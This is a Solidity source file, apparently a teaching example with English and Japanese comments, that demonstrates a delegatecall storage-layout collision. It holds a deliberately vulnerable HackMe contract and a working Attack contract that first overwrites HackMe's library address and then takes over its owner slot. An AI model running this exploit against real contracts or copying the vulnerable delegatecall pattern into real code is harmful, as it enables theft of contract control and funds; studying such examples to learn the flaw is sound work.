// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/*
This is a more sophisticated version of the previous exploit.

1. Alice deploys Lib and HackMe with the address of Lib
2. Eve deploys Attack with the address of HackMe
3. Eve calls Attack.attack()
4. Attack is now the owner of HackMe

What happened?
Notice that the state variables are not defined in the same manner in Lib
and HackMe. This means that calling Lib.doSomething() will change the first
state variable inside HackMe, which happens to be the address of lib.

Inside attack(), the first call to doSomething() changes the address of lib
store in HackMe. Address of lib is now set to Attack.
The second call to doSomething() calls Attack.doSomething() and here we
change the owner.
*/

contract Lib {
    //ステートが１つしかない
    //１つめのslotの値に対応するHackMeのslotが悪用される恐れ
    uint public someNumber; //slot0

    function doSomething(uint _num) public {
        someNumber = _num;
    }
}

contract HackMe {
    //ステートが３つある
    address public lib; //slot0
    address public owner; //slot1
    uint public someNumber; //slot2

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function doSomething(uint _num) public {
        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
    }
}

contract Attack {
    // Make sure the storage layout is the same as HackMe
    // This will allow us to correctly update the state variables
    address public lib; //slot0
    address public owner; //slot1
    uint public someNumber; //slot2

    HackMe public hackMe; //slot3

    constructor(HackMe _hackMe) {
        hackMe = HackMe(_hackMe);
    }

    function attack() public {
        // override address of lib
        //ここでHackMeのlib addressがLib contract addressから Attackにかわる
        hackMe.doSomething(uint(uint160(address(this))));
        // pass any number as input, the function doSomething() below will
        // be called
        //ここでlibのdoSomething()ではなく、AttackのdoSomething()が呼ばれる
        hackMe.doSomething(1);
    }

    // function signature must match HackMe.doSomething()
    function doSomething(uint _num) public {
        //Attack -> HackMe -delegatecall ->Attack
        owner = msg.sender; //Attack contractのaddress
    }
}
